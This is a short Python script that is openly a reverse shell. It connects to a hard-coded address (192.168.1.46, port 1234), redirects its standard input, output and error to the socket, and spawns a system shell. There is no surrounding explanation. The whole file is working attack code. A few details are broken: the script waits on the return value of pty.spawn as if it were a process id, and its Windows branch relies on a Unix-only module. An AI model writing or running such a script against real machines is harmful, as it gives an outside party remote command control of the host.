#!/usr/bin/env python3.11
import socket
import platform
import pty
import os

def shell(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    os.close(sock.fileno())
    
    if platform.system() == "Windows":
        cmd = "cmd.exe"
    else:
        cmd = "/bin/sh"

    reverse_shell = pty.spawn(cmd)

    os.waitpid(reverse_shell, 0)

if __name__ == "__main__":
    host = "192.168.1.46"
    port = 1234
    shell(host, port)
